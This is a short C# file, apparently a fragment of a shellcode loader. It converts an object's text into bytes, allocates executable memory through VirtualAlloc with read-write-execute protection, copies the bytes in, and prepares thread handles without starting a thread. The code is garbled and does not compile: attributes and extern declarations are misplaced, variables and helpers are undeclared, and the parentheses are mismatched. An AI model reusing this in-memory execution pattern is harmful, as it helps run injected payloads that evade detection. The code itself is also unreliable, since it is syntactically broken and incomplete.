using System;
using System.Runtime.InteropServices;

public static class MemoryDirect
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static void Direct_In_Memory<T>(this T? ob) where T : notnull
    {
        stringValue = ob.ToString();
        stringValue.Replace(" ", string.Empty);
        byte[] binaryPatch = ToByteArray(stringValue);      

        IntPtr funcAddr = static extern VirtualAlloc(UIntPtr.Zero)(binaryPatch.Length + 1), (IntPtr)0x1000, (IntPtr)0x40);
        Marshal.Copy(binaryPatch, 0, funcAddr, binaryPatch.Length);

        IntPtr hThread = IntPtr.Zero;
        IntPtr threadId = IntPtr.Zero;        
    }
}
